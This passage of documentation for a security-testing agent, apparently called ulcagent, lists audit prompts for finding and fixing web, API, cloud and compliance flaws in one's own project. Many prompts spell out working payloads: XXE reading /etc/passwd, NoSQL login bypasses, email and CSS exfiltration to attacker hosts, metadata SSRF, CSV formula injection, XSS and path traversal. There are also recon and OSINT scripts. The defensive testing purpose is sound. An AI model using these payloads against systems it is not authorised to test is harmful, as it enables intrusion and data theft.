>>> Write a script that checks mysite.com for exposed backup and artifact files. Try each URL and report any that return 200: /backup.sql, /db.sql, /dump.sql, /backup.zip, /site.tar.gz, /.env.bak, /.env.old, /.env.production, /config.php.bak, /web.config.old, /wp-config.php.save, /application.yml.bak, /.DS_Store (Mac metadata that lists directory contents), /Thumbs.db (Windows), /.idea/ (JetBrains config), /.vscode/settings.json, /package-lock.json (dependency tree), /composer.lock, and /yarn.lock.
```

```
>>> Search the web root directory for files that should never be deployed: *.bak, *.old, *.save, *.swp (vim swap), *.swo, *~, *.orig, *.sql, *.tar.gz, *.zip, *.log, .DS_Store, Thumbs.db, .env*, and any file starting with a dot that isn't .htaccess. List each and recommend removal or .gitignore addition.
```

```
>>> Check if source maps are deployed to production. Search for: *.map files, //# sourceMappingURL= comments in JS/CSS files, and X-SourceMap headers. Source maps let attackers read your original unminified source code including comments, variable names, and internal API endpoints. Remove from production builds.
```

---

## Dead Code & Debug Artifacts

```
>>> Search the codebase for debug artifacts left in production code: print() or console.log() with sensitive data, commented-out authentication checks (// if (!isAdmin)), TODO/FIXME comments mentioning security ("TODO: add auth here"), debug=True or DEBUG=1 in config, test credentials (user: test, password: test123), and disabled CSRF protection with comments like "temporarily disabled". List each with file and line.
```

```
>>> Search for unreachable but still-routed endpoints: admin panels at non-obvious paths (/admin, /dashboard, /manage, /internal, /debug, /phpMyAdmin, /actuator), test endpoints that were never removed (/test, /ping-db, /api/debug, /api/v0/), and health check endpoints that expose internal state (database connection status, queue lengths, memory usage, environment variables). Check each for authentication.
```

```
>>> Read the routing configuration. Find any routes that are defined but have no authentication middleware. Cross-reference with the auth middleware registration to find gaps where a route was added after the auth middleware and accidentally skipped. List unprotected routes.
```

---

## Compliance Checklists

### OWASP Top 10 (2025)

```
>>> Run a full OWASP Top 10 audit against this project. For each category, check the codebase and report PASS/FAIL with evidence:
1. A01 Broken Access Control — check every endpoint for auth + authorization
2. A02 Cryptographic Failures — check password hashing, data encryption, TLS
3. A03 Injection — check for SQL, XSS, command, LDAP, template injection
4. A04 Insecure Design — check for missing rate limiting, missing business logic validation
5. A05 Security Misconfiguration — check default configs, unnecessary features, error handling
6. A06 Vulnerable Components — check dependencies for known CVEs
7. A07 Identification & Auth Failures — check password policy, session management, MFA
8. A08 Software & Data Integrity — check for unsigned updates, insecure CI/CD, deserialization
9. A09 Security Logging & Monitoring — check if attacks are logged and alertable
10. A10 Server-Side Request Forgery — check for SSRF in URL-fetching features
Write a compliance report with severity for each finding.
```

### PCI DSS (for payment handling)

```
>>> Read the payment processing code. Check PCI DSS requirements:
1. Never store full credit card numbers — only last 4 digits for display
2. Never log card numbers, CVVs, or full track data
3. Transmit card data only over TLS 1.2+
4. Use a PCI-compliant payment processor (Stripe, Braintree) — never handle raw card data server-side
5. Tokenize card data immediately on the client (Stripe.js, Braintree Drop-in)
6. Restrict access to payment code to authorized personnel
7. Maintain an audit trail of access to payment functions
Report compliance status for each requirement.
```

### HIPAA (for health/medical data)

```
>>> Search the codebase for health-related data handling: medical records, diagnoses, medications, appointment data, insurance info, and biometric data. For each, verify:
1. Encrypted at rest (database-level or field-level encryption)
2. Encrypted in transit (TLS only, no HTTP)
3. Access logged with user identity and timestamp
4. Minimum necessary access (role-based, not everyone sees everything)
5. Data retention policy enforced (auto-delete after period)
6. BAA (Business Associate Agreement) required for any third-party service that touches the data
7. Breach notification capability (can you identify what was accessed?)
Report compliance gaps.
```

### GDPR / Privacy

```
>>> Audit the project for GDPR compliance:
1. Data inventory — list all PII collected (name, email, IP, location, etc.) and where stored
2. Consent — check if explicit consent is collected before storing PII
3. Right to access — can a user export all their data? Write a test for the data export endpoint
4. Right to erasure — can a user delete their account and ALL associated data? Check for orphaned records in related tables
5. Data minimization — is any PII collected that isn't strictly necessary?
6. Third-party data sharing — list every service that receives PII (analytics, email, payments)
7. Cookie consent — check if non-essential cookies are set before consent
Report compliance status for each.
```

---

## XML & Data Format Attacks

### XXE (XML External Entity)

```
>>> Search the codebase for any XML parsing: xml.etree.ElementTree, lxml, xml.dom, xml.sax, DOMParser, XMLHttpRequest with XML, or any endpoint that accepts Content-Type: application/xml. Check if external entity processing is disabled. Test by sending a payload like <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root> to each XML-accepting endpoint. If it returns file contents, it's vulnerable. Fix by disabling DTD processing entirely.
```

```
>>> Write a test that sends an XML bomb (billion laughs attack) to each XML endpoint: <!DOCTYPE bomb [<!ENTITY a "aaa..."><!ENTITY b "&a;&a;&a;...">...]>. This expands to gigabytes in memory. Check if the server crashes, hangs, or rejects it. Add XML parsing limits (max depth, max entity expansion).
```

### File Format Attacks

```
>>> Read the file upload handler. Test with crafted malicious files beyond just extension checking:
1. SVG with embedded JavaScript (<svg onload="alert(1)">)
2. PDF with JavaScript actions (/JS /JavaScript in the PDF stream)
3. ZIP bomb (42.zip — 42KB that expands to 4.5PB)
4. Polyglot file (valid JPEG header + valid HTML/JS body — bypasses type detection)
5. Image with oversized dimensions (1x1000000 pixels — memory bomb on resize)
6. EXIF data containing script tags (rendered if EXIF is displayed)
Write a test that uploads each and verifies the server rejects or safely handles them.
```

```
>>> Search for image processing code (Pillow, ImageMagick, sharp, jimp). Check for: max dimension limits before resize (prevent memory bombs), EXIF stripping before storage (prevent GPS/PII leakage), SVG sanitization (remove script tags and event handlers), and decompression bomb limits. Fix any missing safeguards.
```

---

## Unicode & Internationalization Attacks

```
>>> Write a script that tests the login and registration endpoints with Unicode edge cases:
1. Homoglyph usernames: "аdmin" (Cyrillic 'а' instead of Latin 'a') — should these be treated as the same user?
2. Right-to-left override: filename "readme\u202Etxt.exe" displays as "readmeexe.txt" — test file upload with RLO characters
3. Null byte injection: "admin\x00.jpg" — some parsers stop at the null, others don't
4. Unicode normalization: "café" (e + combining accent) vs "café" (precomposed é) — check if the app treats these as the same string for usernames, passwords, and file paths
5. Zero-width characters: "a\u200Bb" looks like "ab" but is 3 chars — test in passwords and usernames
Report which attacks succeed and add normalization/sanitization.
```

```
>>> Search for any string comparison that checks domain names, email addresses, or URLs. Check if it normalizes Unicode first — an attacker can register "gооgle.com" (Cyrillic o's) and it looks identical in most fonts. Check for: IDNA/Punycode normalization, confusable character detection, and whether the app displays raw Unicode domains to users.
```

---

## NoSQL Injection

```
>>> Search for MongoDB/Mongoose queries, DynamoDB expressions, or any NoSQL database calls that include user input. Check for operator injection: an attacker sending {"username": {"$gt": ""}, "password": {"$gt": ""}} bypasses login because $gt matches everything. Also check for: $where with user input (JavaScript execution), $regex with user input (ReDoS), and $lookup/$graphLookup with user-controlled collections. Fix by validating that input values are strings, not objects.
```

```
>>> Write a test that sends JSON payloads with MongoDB operators to the login endpoint: {"email": {"$gt": ""}, "password": {"$gt": ""}}, {"email": {"$ne": ""}}, {"email": {"$regex": ".*"}}. If any returns a successful login, the endpoint is vulnerable to NoSQL injection. Also test with nested $where: {"$where": "sleep(5000)"} to detect blind injection via timing.
```

---

## Email Security

```
>>> Read the contact form / email sending code. Check for email header injection: can a user put newlines in the "from" or "subject" field to inject CC, BCC, or additional headers? Test by submitting a contact form with subject "test\r\nBCC: attacker@evil.com" and check if the attacker receives a copy. Fix by stripping \r and \n from all header fields.
```

```
>>> Read the HTML email templates. Check for: user-controlled content rendered without sanitization (stored XSS in emails), remote image loading that tracks opens (privacy leak), CSS that can exfiltrate data (background-image: url(https://attacker.com/?data=secret)), and links that use HTTP instead of HTTPS. Fix by sanitizing user content and using a strict CSP for HTML emails.
```

```
>>> Write a script that tests if the mail server (if self-hosted) is an open relay: connect to the SMTP port (25/587), attempt to send mail FROM an external address TO another external address. If it accepts, the server can be used for spam. Test with: EHLO test, MAIL FROM: <evil@attacker.com>, RCPT TO: <victim@other.com>. Report if the server rejects or accepts the relay.
```

---

## PDF Generation SSRF

```
>>> Search for HTML-to-PDF generation code: wkhtmltopdf, Puppeteer, Playwright, WeasyPrint, pdfkit, or any headless browser rendering. These fetch embedded resources — an attacker who controls the HTML input can include: <img src="file:///etc/passwd"> (local file read), <iframe src="http://169.254.169.254/latest/meta-data/"> (AWS metadata SSRF), <link href="http://attacker.com/?data=leak"> (data exfiltration via CSS). Fix by: sandboxing the renderer, blocking file:// and internal IP schemes, and using a URL allowlist for resource loading.
```

```
>>> Write a test that generates a PDF with embedded resource requests to: file:///etc/passwd, http://127.0.0.1:6379 (Redis), http://169.254.169.254 (cloud metadata), and https://attacker-canary.com. Check the generated PDF for: leaked file contents, internal service responses, and whether the canary URL was actually fetched (check server logs). Report which vectors succeed.
```

---

## Browser Security Headers (Deep Audit)

```
>>> Read the security headers returned by the application. Don't just check if they exist — check if they're EFFECTIVE:
1. Content-Security-Policy: is 'unsafe-inline' present? (defeats XSS protection). Is 'unsafe-eval' present? Are there wildcard sources (*.example.com)? Is it report-only (doesn't actually block)?
2. Permissions-Policy: are camera, microphone, geolocation, payment restricted?
3. Cross-Origin-Opener-Policy: is it set to same-origin? (prevents Spectre-style attacks)
4. Cross-Origin-Embedder-Policy: is it set to require-corp? (enables SharedArrayBuffer safely)
5. Cross-Origin-Resource-Policy: is it set to same-origin? (prevents cross-origin data leaks)
6. X-Frame-Options: is ALLOWALL used instead of DENY?
7. Referrer-Policy: is it no-referrer or strict-origin-when-cross-origin? (prevents URL leakage)
For each header, report the current value, whether it's effective, and the recommended value.
```

```
>>> Write a CSP evaluator script that parses the Content-Security-Policy header and checks for common bypasses: cdn.jsdelivr.net in script-src (allows arbitrary JS via npm packages), 'unsafe-inline' (XSS protection nullified), data: in script-src (inline script via data URI), blob: in script-src, missing base-uri (base tag injection), missing form-action (form hijacking), and report-only mode (no enforcement). Score the CSP from 0-100.
```

---

## API Pagination & Query Abuse

```
>>> Read all API endpoints that return lists. Check for: missing default page_size (attacker requests all records at once), page_size not capped (page_size=999999), negative page numbers or offsets, cursor/token manipulation (can an attacker skip ahead or access other users' pages), and whether total count is exposed (reveals database size to attackers). Add page_size caps (max 100) and validate all pagination parameters.
```

```
>>> Write tests that send abusive pagination requests: page_size=0, page_size=-1, page_size=1000000, page=99999999, offset=-1, and cursor=AAAA (garbage). Check if the server: returns an error (safe), returns everything (vulnerable to data dump), hangs (vulnerable to DoS), or crashes. Report each endpoint's behavior.
```

---

## Insecure Randomness

```
>>> Search ALL code (Python, JS, Go, Java) for insecure random number generators used in security contexts: Python random.random/randint (use secrets.token_hex instead), JavaScript Math.random (use crypto.getRandomValues), Go math/rand (use crypto/rand), Java java.util.Random (use java.security.SecureRandom). Check if any are used for: session tokens, password reset tokens, CSRF tokens, API keys, encryption keys/IVs, or verification codes. Replace with cryptographically secure alternatives.
```

```
>>> Write a test that collects 10000 tokens from the token generation endpoint and checks for: sequential patterns, timestamp-based predictability, insufficient entropy (less than 128 bits), and duplicates. Use a chi-squared test or basic statistical analysis to detect bias. Report the effective randomness quality.
```

---

## Monitoring & Observability Exposure

```
>>> Write a script that checks for exposed monitoring endpoints at common paths: /metrics (Prometheus), /health (often includes internal info), /actuator (Spring Boot — exposes env vars, heap dumps), /debug/pprof (Go profiler), /debug/vars (Go runtime stats), /_cluster/health (Elasticsearch), /server-status (Apache), /nginx_status (Nginx), /graphql (introspection query), and /admin/monitoring. For each that returns 200, check if it requires authentication and what data it exposes.
```

```
>>> Read the error tracking configuration (Sentry, Rollbar, Bugsnag, etc.). Check if: source maps are uploaded (exposes source code to anyone with access to the error tracking dashboard), stack traces include local file paths, environment variables are captured in error context, user PII is included in error reports (emails, IPs), and the DSN/API key is exposed in client-side code (allows anyone to send fake errors).
```

---

## Electron & Desktop App Security

```
>>> Read the Electron main process code (main.js/main.ts). Check for critical settings:
1. nodeIntegration — must be false (true = any XSS becomes full system RCE)
2. contextIsolation — must be true (isolates preload from renderer)
3. sandbox — should be true (OS-level process isolation)
4. webSecurity — must be true (false disables same-origin policy entirely)
5. allowRunningInsecureContent — must be false
6. shell.openExternal — must validate URLs (attacker can open file:// or custom protocol handlers)
7. Preload script — check for exposed Node.js APIs via contextBridge
Report each setting's current value and fix any that are insecure.
```

```
>>> Search the Electron app for: require('child_process') in renderer (should only be in main), IPC messages without validation (renderer sends arbitrary commands to main), auto-updater without signature verification (attacker can serve malicious updates), and deep link / custom protocol handlers without input sanitization. Fix each finding.
```

---

## Scheduled Jobs & Background Processing

```
>>> Read the cron job / scheduled task configurations. Check for: jobs running as root/admin when they don't need to, job output logged with sensitive data, race conditions between cron and user requests (e.g., cron deletes expired sessions while a user is mid-request), job failures that silently skip security tasks (certificate renewal, key rotation, audit log shipping), and whether job schedules are exposed to users.
```

```
>>> Read the background job / message queue code (Celery, Bull, Sidekiq, etc.). Check for: task arguments containing secrets (visible in queue monitoring), deserialization of job payloads without validation (pickle in Celery = RCE), missing job timeout (stuck job consumes worker forever), missing dead letter queue monitoring (failed security-critical jobs go unnoticed), and whether workers run with the same permissions as the web server (should be separate).
```

---

## Feature Flags & Configuration

```
>>> Search for feature flag implementations (LaunchDarkly, Unleash, custom). Check if: flag values are exposed to the client (attacker can see unreleased features), flags can be overridden via URL params or cookies (flag=true in query string), any flags control security features (MFA, rate limiting, auth checks — these should NEVER be flaggable), and flag evaluation is server-side (not client-side where it can be manipulated).
```

---

## Additional Attack Vectors

### Reconnaissance (extended)

```
>>> Write a script that queries certificate transparency logs (crt.sh) for all certificates issued to mysite.com and *.mysite.com. This reveals every subdomain that has ever had a certificate — including internal, staging, and forgotten services. Parse the results and check which subdomains still resolve.
```

```
>>> Write a script that checks the Wayback Machine (web.archive.org) for historical snapshots of mysite.com. Look for: old endpoints that may still work, removed pages that contained sensitive info, previously exposed config files, and old JavaScript files with API keys. Query: http://web.archive.org/cdx/search/cdx?url=mysite.com/*&output=json&limit=100.
```

```
>>> Write a script that performs WHOIS lookup on mysite.com and reports: registrar, registration/expiry dates, nameservers, and whether WHOIS privacy is enabled. Flag if: domain expires within 60 days (hijacking risk), WHOIS privacy is off (personal info exposed), or nameservers use a deprecated provider.
```

### XSS — All Three Types

```
>>> Test for reflected XSS: write a script that sends requests to every endpoint with XSS payloads in each query parameter, header, and path segment: <script>alert(1)</script>, javascript:alert(1), <img onerror=alert(1) src=x>, and " onmouseover="alert(1). Check if the payload appears unescaped in the response HTML. Report vulnerable parameters.
```

```
>>> Search the codebase for stored XSS vectors: any user input (comments, profile fields, messages, filenames) that is later rendered in HTML. Check if the output is escaped. Test by storing a payload like <img src=x onerror=alert(document.cookie)> in each field and checking if it executes when another user views the page.
```

### Session Attacks

```
>>> Test for session hijacking vectors: check if session cookies have the Secure flag (prevents sniffing over HTTP), HttpOnly flag (prevents JS access), and SameSite attribute. Write a test that: sets a session cookie, then attempts to read it via JavaScript (document.cookie) — if readable, HttpOnly is missing. Also check if the session ID changes after login (prevents session fixation).
```

```
>>> Read the "remember me" / persistent login implementation. Check if: the remember-me token is a random value (not just the user ID or a hash of the password), tokens are stored hashed server-side, each token is single-use (rotated on each auto-login), tokens have a bounded expiration, and token theft is detectable (using the same token from two IPs triggers invalidation). Fix any missing protections.
```

```
>>> Check for concurrent session handling: can a user be logged in from 10 devices simultaneously? Is there a session limit? Can the user see/revoke other sessions? Write a test that creates 5 sessions for the same user and checks if the server: allows all (risky for shared accounts), limits to N (good), or alerts the user about concurrent logins.
```

```
>>> Test for account lockout implementation: send 20 failed login attempts. Check: does the account lock after N failures? Is the lockout time-based or permanent? Does it lock per-IP or per-account (per-account can be weaponized to lock out any user)? Is there a CAPTCHA before lockout? Is the lockout message the same as the normal failure message (prevents enumeration)?
```

### HTTP Protocol Attacks

```
>>> Write a test for HTTP parameter pollution: send duplicate parameters to each endpoint (e.g., ?id=1&id=2). Check if the server uses the first value, last value, or an array. If the WAF checks the first but the app uses the last, the WAF is bypassed. Also test: POST body + URL query with the same parameter name, and JSON + form-data with conflicting values.
```

```
>>> Write a test for HTTP response splitting: inject \r\n characters in any header value that reflects user input (Location redirects, Set-Cookie, custom headers). Payload: value%0d%0aInjected-Header:%20true. If the injected header appears in the response, the attacker can set arbitrary cookies, inject HTML, or poison caches.
```

```
>>> Check for MIME type confusion attacks: upload a file with a .jpg extension but HTML content. Check if the server serves it with Content-Type: text/html (XSS) or image/jpeg (safe). Verify that X-Content-Type-Options: nosniff is set — without it, browsers may ignore the Content-Type and sniff the actual content.
```

### Directory & Path Attacks

```
>>> Write a script that checks for directory listing on the web server. Request common directories: /, /images/, /uploads/, /static/, /assets/, /backup/, /data/, /tmp/, /logs/. If any return an HTML page listing files (look for "Index of" or file list patterns), directory listing is enabled and needs to be disabled. Report exposed directories.
```

### Client-Side Storage

```
>>> Search the JavaScript code for IndexedDB usage (indexedDB.open, createObjectStore). Check if any sensitive data is stored: auth tokens, user PII, cached API responses with sensitive fields, encryption keys, or session data. IndexedDB is accessible to any script on the same origin — including injected XSS scripts. Sensitive data should use encrypted storage or server-side sessions instead.
```

```
>>> Search for Service Worker registrations (navigator.serviceWorker.register). Check if: the service worker script is served with proper Cache-Control (prevents stale cached version), the scope is restricted (/ scope = controls all pages), the worker validates fetch responses (a hijacked worker can intercept and modify all network requests), and the registration only happens over HTTPS.
```

```
>>> Search for DOM clobbering vulnerabilities: any JavaScript that accesses named elements via document.getElementById or implicit global access (using an element's id or name as a variable). An attacker who can inject HTML (even without script tags — like via a Markdown renderer) can create elements whose id matches variable names, overriding values. Test by injecting <img id="isAdmin"> and checking if the app's isAdmin check breaks.
```

### Container Orchestration

```
>>> Read the Kubernetes manifests (deployments, services, RBAC). Check for: containers running as root (runAsNonRoot: false), privileged mode enabled, host network access, host path mounts to sensitive directories, service accounts with cluster-admin role, missing network policies (all pods can talk to all pods), secrets mounted as environment variables instead of files (visible in process listing), and missing resource limits (container can consume all node resources). Fix each finding.
```

```
>>> Check Kubernetes RBAC configuration: list all ClusterRoleBindings and RoleBindings. Flag any that bind to cluster-admin, any that use wildcards in rules (verbs: ["*"], resources: ["*"]), and any service accounts that have more permissions than their workload requires. Apply least-privilege by creating specific roles for each service.
```

### Host Header Attacks

```
>>> Write a test that sends requests with manipulated Host headers: a different domain, an internal hostname, localhost, and an IP address. Check if: the application uses the Host header to generate URLs (password reset links, OAuth redirects, canonical URLs) — if so, an attacker can make the app generate links pointing to their domain. Also check if different Host values serve different content (virtual host confusion). Fix by validating the Host header against a whitelist.
```

---

## Final Edge Cases

### Injection (remaining types)

```
>>> Search for any code that builds XPath queries from user input. Test by injecting: ' or '1'='1 into any XML search field. If results change, the endpoint is vulnerable to XPath injection. Fix by using parameterized XPath queries or input validation.
```

```
>>> Search for any feature that exports data as CSV. Check if user-controlled fields (names, comments, descriptions) are sanitized before CSV export. An attacker can inject formulas like =CMD("calc") or =HYPERLINK("http://evil.com") that execute when the CSV is opened in Excel. Fix by prefixing cell values starting with =, +, -, or @ with a single quote.
```

### Recon (remaining sources)

```
>>> Write a script that performs OSINT (Open Source Intelligence) gathering on the target domain: check GitHub for public repos by the org, search Pastebin/GitHub Gist for leaked credentials mentioning the domain, check HaveIBeenPwned API for breached accounts at the domain, and look for public Trello/Jira boards mentioning the project name. Report all findings.
```

```
>>> Write a script that queries Shodan (if API key available) or Censys for the target IP. Report: open ports, running services with versions, known vulnerabilities for each service version, SSL certificate details, and whether any exposed services have known default credentials. If no API key, use the free web search at shodan.io and report what's publicly visible.
```

### Browser & Client Quirks

```
>>> Search all HTML for links with target="_blank" that are missing rel="noopener noreferrer". Without noopener, the opened page can access window.opener and redirect the original tab to a phishing page (tabnabbing attack). Fix by adding rel="noopener noreferrer" to every target="_blank" link.
```

```
>>> Search for any WebRTC usage (RTCPeerConnection, getUserMedia). WebRTC can leak the user's real IP address even through a VPN via ICE candidate gathering. Check if the app: uses TURN servers only (prevents direct peer connection leaking IPs), or if ICE candidates are filtered to remove local/private IPs before sending to peers. Report exposure risk.
```

```
>>> Check if the application sets Cache-Control: no-store on responses containing sensitive data (account pages, API responses with PII, auth tokens). Without no-store, browsers cache the response and it's readable from the disk cache by any local user or malware. Test by logging in, visiting a sensitive page, then checking the browser cache directory for the response.
```

```
>>> Search all HTML forms that handle passwords, credit cards, SSNs, or other sensitive data. Check if the input fields have autocomplete="off" (or autocomplete="new-password" for password fields). Without this, browsers save the data in their autofill database — accessible to any XSS or local attacker. Fix each sensitive input.
```

```
>>> Search for any JSONP endpoints (callback parameter that wraps JSON in a function call). JSONP bypasses same-origin policy — any website can read your API's data by adding a script tag. If JSONP endpoints exist and return user-specific data, they're a data theft vector. Replace with CORS or remove JSONP entirely.
```

### Numeric & Type Attacks

```
>>> Read all API endpoints that accept numeric parameters (IDs, quantities, prices, page numbers). Test with: negative values (-1), zero, very large values (2147483647, 9999999999999), floating point (1.5 where integer expected), NaN, Infinity, and string values where numbers are expected. Check for: integer overflow, unexpected behavior with negatives, and whether the server validates types. Report each endpoint's handling.
```

### File Download Attacks

```
>>> Search for any file download/serve endpoint that takes a filename or path parameter. Test for path traversal in the download path: /download?file=../../../etc/passwd, /download?file=....//....//etc/passwd (double encoding), /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL encoded). If any return file contents outside the intended directory, the endpoint is vulnerable. Fix by resolving the path and verifying it's within the allowed directory.
```

### Supply Chain (remaining)

```
>>> Read package.json or requirements.txt. Check for typosquatting risk: compare each package name against known typosquat databases. Common patterns: transposed letters (requsets vs requests), missing hyphens (python-dateutil vs pythondateutil), extra suffixes (lodash-utils vs lodash). For each dependency, verify the publisher is legitimate by checking the package registry page.
```

### Network (remaining)

```
>>> Write a script that checks if the current machine is running an open DNS resolver: send a DNS query to the machine's IP from an external perspective (or test locally with dig @localhost). An open resolver can be abused for DNS amplification DDoS attacks. If open, configure the DNS server to only accept queries from authorized networks.
```

---

## Tips for Security Testing with ulcagent

- **Be specific about the vulnerability class.** "Check for XSS" works better than "check for security issues."
- **Name the file.** "Read auth.py and check for..." beats "check the auth system."
- **Ask for both the test AND the fix.** "Find the vulnerability and fix it" gets you a working patch.
- **For live testing**, always specify the exact URL: "Test https://localhost:8000/api/login for..."
- **Chain goals with session memory:** read the code first, then ask for tests, then ask it to fix what it found.
- **Use /diff after fixes** to review exactly what changed before committing.

### Example Full Workflow

```
>>> Read all files in the auth/ directory and list the endpoints
>>> Check each endpoint for OWASP Top 10 vulnerabilities
>>> Write pytest tests for the 3 most critical findings
>>> Run the tests
>>> Fix the failing tests by patching the vulnerable code
>>> /diff
>>> /commit
```
